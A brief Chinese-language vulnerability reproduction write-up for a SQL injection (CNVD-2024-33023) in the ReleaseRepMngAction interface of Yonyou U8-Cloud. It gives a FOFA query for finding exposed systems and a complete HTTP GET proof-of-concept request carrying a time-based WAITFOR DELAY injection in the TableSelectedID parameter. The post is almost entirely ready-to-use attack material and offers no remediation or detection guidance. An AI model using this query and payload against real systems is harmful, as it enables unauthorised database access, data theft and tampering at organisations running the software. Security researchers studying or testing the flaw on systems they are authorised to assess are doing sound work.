# 用友U8-Cloud系统接口ReleaseRepMngAction存在SQL注入漏洞复现(CNVD-2024-33023)

用友U8-Cloud系统接口ReleaseRepMngAction存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa
```javascript
title=="U8C"
```

## poc
```javascript
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![image-20241219152517973](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191525077.png)